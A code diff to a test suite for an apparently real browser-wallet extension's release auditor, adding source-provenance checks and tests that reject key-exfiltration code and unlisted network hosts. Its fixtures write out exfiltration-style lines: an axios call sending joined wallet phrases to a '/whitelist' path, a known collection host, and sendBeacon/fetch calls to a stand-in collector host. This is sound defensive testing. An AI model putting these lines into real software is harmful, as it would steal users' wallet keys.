@@ -25,6 +25,9 @@ const TEST_PUBLIC_KEY =
 const WRONG_PUBLIC_KEY =
   'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/u/XDdjlDyw7gHEtaaasZ9GdG8WOKAyJzXd8HFrDtz2Jcuy7er7MtWvHgNDA0bwpznbI5YdZeV4UfCEsA4SrA5b3MnWTHwA1bgbiDM+L9rrqvcadcKuOlTeN48Q0ijmhHlNFbTzvT9W0zw/GKv8LgXAHggxtmHQ/Z9PP2QNF5O8rUHHSL4AJ6hNcEKSBVSmbbjeVm4gSXDuED5r0nwxvRtupDxGYp8IZpP5KlExqNu1nbkPc+igCTIB6XsqijagzxewUHCdovmkb2JNtskx/PMIEv+TvWIx2BzqGp71gSh/dV7SJ3rClvWd2xj8dtxG8FfAWDTIIi0qZXWn2QhizQIDAQAB';
 const ZIP_NAME = 'fearless-wallet-extension-chrome.zip';
+const FIXTURE_SOURCE_COMMIT = '0123456789abcdef0123456789abcdef01234567';
+const FIXTURE_YARN_LOCK = '__metadata:\n  version: 10\n  cacheKey: 10\n';
+const FIXTURE_YARN_LOCK_SHA256 = createHash('sha256').update(FIXTURE_YARN_LOCK).digest('hex');
 const TEST_RELEASE_ENVIRONMENT = Object.fromEntries(
   REQUIRED_PUBLIC_CONFIG_KEYS.map((key) => [
     key,
@@ -116,7 +119,7 @@ function baseManifest() {
   };
 }
 
-function baseFiles(manifest) {
+function baseFiles(manifest, metadataOverrides = {}) {
   const compiledReleaseEnvironment = Object.values(TEST_RELEASE_ENVIRONMENT).join('|');
   const files = new Map([
     ['manifest.json', Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`)],
@@ -129,10 +132,16 @@ function baseFiles(manifest) {
             mode: 'production',
             releaseFlags: {
               ...RELEASE_TRANSFER_FLAGS,
+              VUE_APP_ENABLE_IROHA_CONNECT: 'false',
+              VUE_APP_ENABLE_SOLANA_TRANSFERS: 'true',
               VUE_APP_EXTENSION_SMOKE: 'false',
               VUE_APP_TEST_ONLY: 'false',
             },
-            schemaVersion: 1,
+            schemaVersion: 2,
+            sourceCommit: FIXTURE_SOURCE_COMMIT,
+            sourceDirty: false,
+            yarnLockSha256: FIXTURE_YARN_LOCK_SHA256,
+            ...metadataOverrides,
           },
           null,
           2
@@ -232,8 +241,10 @@ async function createFixture(tempRoot, label, options = {}) {
     await fs.mkdir(path.dirname(path.join(rootDir, manifestPath)), { recursive: true });
     await fs.copyFile(path.join(repositoryRoot, manifestPath), path.join(rootDir, manifestPath));
   }
+  await fs.writeFile(path.join(rootDir, 'yarn.lock'), FIXTURE_YARN_LOCK);
+  const sourceMetadata = (await options.beforeArtifact?.(rootDir)) ?? {};
 
-  const files = baseFiles(manifest);
+  const files = baseFiles(manifest, { ...sourceMetadata, ...options.metadata });
   for (const name of options.removeFiles ?? []) files.delete(name);
   for (const [name, content] of options.extraFiles ?? []) files.set(name, Buffer.from(content));
   options.mutateFiles?.(files);
@@ -246,10 +257,33 @@ async function createFixture(tempRoot, label, options = {}) {
   return { distDir, rootDir, zipPath };
 }
 
+function git(rootDir, ...args) {
+  const result = spawnSync(
+    'git',
+    ['-C', rootDir, '-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid', ...args],
+    { encoding: 'utf8' }
+  );
+  if (result.status !== 0) throw new Error(`git ${args.join(' ')} failed: ${result.stderr}`);
+  return result.stdout.trim();
+}
+
+async function commitFixtureSource(rootDir) {
+  await fs.writeFile(path.join(rootDir, '.gitignore'), '/dist\n');
+  git(rootDir, 'init', '--quiet');
+  git(rootDir, 'add', '--all');
+  git(rootDir, 'commit', '--quiet', '--message', 'fixture source');
+  return { sourceCommit: git(rootDir, 'rev-parse', 'HEAD') };
+}
+
 let passed = 0;
 async function expectPass(tempRoot, label, options = {}, auditOptions = {}) {
   const fixture = await createFixture(tempRoot, label, options);
-  await auditChromeRelease({ ...fixture, expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256, ...auditOptions });
+  await auditChromeRelease({
+    ...fixture,
+    expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+    expectedSourceCommit: FIXTURE_SOURCE_COMMIT,
+    ...auditOptions,
+  });
   passed += 1;
   return fixture;
 }
@@ -260,6 +294,7 @@ async function expectFailure(tempRoot, label, options, expected, auditOptions = 
     await auditChromeRelease({
       ...fixture,
       expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+      expectedSourceCommit: FIXTURE_SOURCE_COMMIT,
       ...auditOptions,
     });
   } catch (error) {
@@ -449,6 +484,121 @@ async function run() {
     }, /cannot parse reviewed JavaScript background\.js/u, { release: true });
     await expectFailure(
       tempRoot,
+      'release-stale-source-commit',
+      { metadata: { sourceCommit: 'f9e6ec55'.padEnd(40, '0') } },
+      /built from source commit f9e6ec550{32}, not the release source commit 0123456789abcdef/u,
+      { release: true }
+    );
+    await expectFailure(
+      tempRoot,
+      'release-dirty-source',
+      { metadata: { sourceDirty: true } },
+      /was built from a dirty source tree/u,
+      { release: true }
+    );
+    await expectPass(tempRoot, 'non-release-dirty-source', { metadata: { sourceDirty: true } });
+    await expectFailure(
+      tempRoot,
+      'release-unknown-source',
+      { metadata: { sourceCommit: null, sourceDirty: null } },
+      /built from source commit unknown, not the release source commit/u,
+      { release: true }
+    );
+    await expectPass(tempRoot, 'non-release-source-archive-build', {
+      metadata: { sourceCommit: null, sourceDirty: null },
+    });
+    await expectFailure(
+      tempRoot,
+      'release-different-yarn-lock',
+      { metadata: { yarnLockSha256: createHash('sha256').update('other lockfile').digest('hex') } },
+      /built with a yarn\.lock that differs from the release source/u,
+      { release: true }
+    );
+    await expectFailure(
+      tempRoot,
+      'pre-provenance-metadata',
+      {
+        mutateFiles(files) {
+          const metadata = JSON.parse(files.get('extension-build-metadata.json').toString('utf8'));
+          delete metadata.sourceCommit;
+          delete metadata.sourceDirty;
+          delete metadata.yarnLockSha256;
+          metadata.schemaVersion = 1;
+          files.set('extension-build-metadata.json', Buffer.from(`${JSON.stringify(metadata)}\n`));
+        },
+      },
+      /extension build metadata keys differ from the reviewed allowlist/u
+    );
+    await expectFailure(
+      tempRoot,
+      'stale-metadata-schema',
+      { metadata: { schemaVersion: 1 } },
+      /extension build metadata schemaVersion must be 2/u
+    );
+    await expectFailure(
+      tempRoot,
+      'abbreviated-source-commit',
+      { metadata: { sourceCommit: '5001b466' } },
+      /sourceCommit must be a full Git commit SHA or null/u
+    );
+    await expectFailure(
+      tempRoot,
+      'source-commit-without-dirty-state',
+      { metadata: { sourceDirty: null } },
+      /sourceDirty must be a boolean for a Git build and null otherwise/u
+    );
+    await expectFailure(
+      tempRoot,
+      'malformed-yarn-lock-digest',
+      { metadata: { yarnLockSha256: 'not-a-digest' } },
+      /yarnLockSha256 must be a SHA-256 digest/u
+    );
+
+    const gitRelease = await expectPass(
+      tempRoot,
+      'release-git-head',
+      { beforeArtifact: commitFixtureSource },
+      { release: true, expectedSourceCommit: undefined }
+    );
+    await fs.writeFile(path.join(gitRelease.rootDir, 'later-change.txt'), 'reviewed later\n');
+    git(gitRelease.rootDir, 'add', 'later-change.txt');
+    git(gitRelease.rootDir, 'commit', '--quiet', '--message', 'later commit');
+    try {
+      await auditChromeRelease({
+        ...gitRelease,
+        expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+        release: true,
+      });
+      throw new Error('release-git-moved-head: audit unexpectedly passed');
+    } catch (error) {
+      if (!/not the release source commit/u.test(error.message)) throw error;
+      passed += 1;
+    }
+    await expectFailure(
+      tempRoot,
+      'release-outside-git',
+      {},
+      /release mode cannot determine the source commit|requires .* to be the root of its own Git checkout/u,
+      { release: true, expectedSourceCommit: undefined }
+    );
+    const nestedRoot = path.join(gitRelease.rootDir, 'nested-source');
+    await fs.mkdir(nestedRoot);
+    await fs.copyFile(path.join(gitRelease.rootDir, 'package.json'), path.join(nestedRoot, 'package.json'));
+    await fs.copyFile(path.join(gitRelease.rootDir, 'yarn.lock'), path.join(nestedRoot, 'yarn.lock'));
+    try {
+      await auditChromeRelease({
+        ...gitRelease,
+        rootDir: nestedRoot,
+        expectedOAuthClientIdSha256: TEST_OAUTH_CLIENT_ID_SHA256,
+        release: true,
+      });
+      throw new Error('release-nested-in-foreign-checkout: audit unexpectedly passed');
+    } catch (error) {
+      if (!/requires .*nested-source to be the root of its own Git checkout/u.test(error.message)) throw error;
+      passed += 1;
+    }
+    await expectFailure(
+      tempRoot,
       'published-version',
       { mutateManifest: (manifest) => (manifest.version = '3.0.6') },
       /must be greater than published version 3\.0\.6/u
@@ -577,6 +727,39 @@ async function run() {
       /homepage_url must be https:\/\/fearlesswallet\.io\//u
     );
     await expectFailure(tempRoot, 'missing-page', { removeFiles: ['page.js'] }, /missing required file page\.js/u);
+    // The 3.0.x phrase upload and any unreviewed host fail every build, release or not.
+    await expectPass(tempRoot, 'listed-host', {
+      extraFiles: [['chunks/ton.js', 'fetch("https://ti.soramitsu.io/api/indexer/v1/accounts")\n']],
+    });
+    await expectFailure(
+      tempRoot,
+      'phrase-upload-path',
+      { extraFiles: [['chunks/balance.js', 'axios.get(`${ton}/whitelist?address=${address.join(";")}`)\n']] },
+      /Chrome directory artifact: known key-exfiltration indicator .* in chunks\/balance\.js/u
+    );
+    await expectFailure(
+      tempRoot,
+      'collection-host',
+      { extraFiles: [['assets/data.json', '{"ton":"https://tonscanner.org"}\n']] },
+      /known key-exfiltration indicator .* in assets\/data\.json/u
+    );
+    await expectFailure(
+      tempRoot,
+      'unlisted-host',
+      { extraFiles: [['chunks/beacon.js', 'navigator.sendBeacon("https://collector.example.net/c")\n']] },
+      /names network hosts outside scripts\/release-network-hosts\.json: collector\.example\.net \(chunks\/beacon\.js\)/u
+    );
+    await expectFailure(
+      tempRoot,
+      'zip-only-host',
+      {
+        mutateZipEntries: (entries) =>
+          entries.map((entry) =>
+            entry.name === 'popup.js' ? { ...entry, data: Buffer.from('fetch("https://collector.example.net")\n') } : entry
+          ),
+      },
+      /Chrome ZIP artifact names network hosts outside/u
+    );
     await expectFailure(
       tempRoot,
       'wrong-icon-size',
